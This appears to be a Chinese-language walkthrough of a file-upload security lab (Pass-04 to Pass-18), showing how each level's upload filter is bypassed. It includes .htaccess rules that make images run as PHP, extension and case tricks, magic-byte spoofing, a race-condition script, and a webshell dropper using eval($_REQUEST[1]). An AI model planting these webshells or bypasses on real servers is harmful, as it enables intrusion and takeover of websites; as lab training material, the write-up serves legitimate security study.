前几关没有难度直接跳过

Pass-04

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0161662eb747.webp)

分析源码发现网站把常见的php，asp等后缀全都过滤了

会删除末尾的点

会将文件名全部转换为小写（也就是大写绕过不行）

最后会进行末尾去空

然后我们知道windows文件名末尾加“.”会自动省略

所以这一关我们采用在文件名末尾加“. .”的方式进行绕过

先正常上传shell.php，然后用burp抓包拦截

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1deacd7d3f76.png)

放行后会发现文件正常上传

然后复制文件的保存路径

用蚁剑连接

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3a790c7dcc37.png)

连接成功

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/de9c22687d04.webp)

查看过滤条件，我们会发现他并没有过滤掉**Apache 服务器的配置文件——.htaccess**他能够篡改服务器解析规则。

也就是我们上传一个 .htaccess 文件能让服务器把任意文件名当成 PHP 脚本执行。

默认将所有的后缀当成PHP解析

SetHandler application/x-httpd-php

把.png为结尾的当成php解析

AddType application/x-httpd-php .png

把包含jpg的文件名当成php解析

<FilesMatch “.jpg”>

SetHandler application/x-httpd-php

</FilesMatch>

上传如图所示的.htaccess

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1dd0f2e20445.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8641deb36516.png)

然后再上传一句话木马改名的png或者jpg等图片格式的文件

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a14820d3bb3a.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/81c7f22143c0.png)

然后这个图像文件就会被解析为php文件执行

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ace9e7da5855.png)

Pass-05

跟上面的操作一样

Pass-06

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7d5116c3c8b5.webp)

网站将图片的文件名和后缀分开处理后，增加随机数进行拼接

拿图片测试

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/085d818a5665.webp)

但是发现该关卡对于文件名的大小写并未进行处理

所以使用大小写进行绕过

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/761ae08d8aa0.png)

上传成功

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6c317ba76779.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6844042d79fc.png)

Pass-07

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cd41d566b674.webp)

这一关直接将文件名删除了，对后缀进行处理后，用日期和随机数做成的文件名进行拼接，从而变成最终的上传路径。

但是我发现他的后缀范围中并未包含php7的后缀，于是我们直接将后缀改为“php7”从而实现绕过

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/eaf01bb9c01b.png)

Pass-08-Pass-10都可以更改后缀为“php7”来实现绕过

Pass-11

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6f95ead311e6.webp)

这一关就不同了，这一关有一句

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/18c543cfa625.png)

直接将文件名中所有的黑名单字符串给替换为空了，而且他这个是大小写不敏感的，所以无法使用大小写绕过。

但是他是字符串校验，“php”这个字符串连在一起才会替换

所以我们将后缀名改为“pphphp”

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c7b7439cdd4c.png)

这样他只会将中间那个“php”替换留下“p   hp”

Pass-12

这一关只允许上传指定的文件

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/95e4bd041313.webp)

但其实php代码无论文件格式都能执行

Pa

Pass-14

首先，查看源码，发现网站通过读取文件中前两个字节，来过滤不是图片格式的文件。

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/69ec94c7630f.png)

于是，我们将我们的一句话木马前加上正常图片格式的编码，从而绕过过滤。

我通过visual studio code 中hex editor拓展包，编辑一句话木马的编码，使得文件的编码前两位字节是jpg格式，并且修改其后缀为.jpg。

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bfc6fa07a3cd.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6a2bcce06dd2.png)

提交该一句话木马，可以看到提交成功。

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/05976b474605.png)

然后，将文件路径放入菜刀，输入我们在一句话木马中给的密码，就可以进入网站的后台。

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e1b1f13e2769.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/618f25e87ca7.webp)

Pass-18

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/70b33e217e98.webp)

这一关他是先将文件不经过检验过滤就上传到服务器，之后才进行检测删除

可以使用条件竞争的手法攻破

所以我们可以利用时间差做一个木马，生成另一个php文件的代码。只要我们在文件未被删除之前，访问到对应的文件生成木马，这样我们就可以利用新生成的木马攻破网站。

这时候我们可以重放两个请求包

一个是一直往网站上发送木马

一个是一直去访问发上去的木马

木马的代码如下

<?php fputs(fopen('backdoor.php','w'),'<?php @eval($_REQUEST[1]);?>');?>

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c40c60bb4e53.webp)

上传后拦截请求

然后右键sent to intruder

payload如下，continue indefinitely表示一直去发送

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9499fc20b73e.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2df14ff3db50.webp)

然后写个python脚本一直访问competition.php使他执行生成backdoor.php

import requests<br>url = "http://10.7.11.46/04/upload/competition.php"<br>while True:<br>    html = requests.get(url)<br>    if html.status_code == 200:<br>        print("OK")<br>        break<br>    else:<br>      print("DOWN")

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/545b51455b2f.png)

最后尝试访问backdoor.php，连接成功

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ec53d3d886ce.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0fd4bc20a6dd.webp)
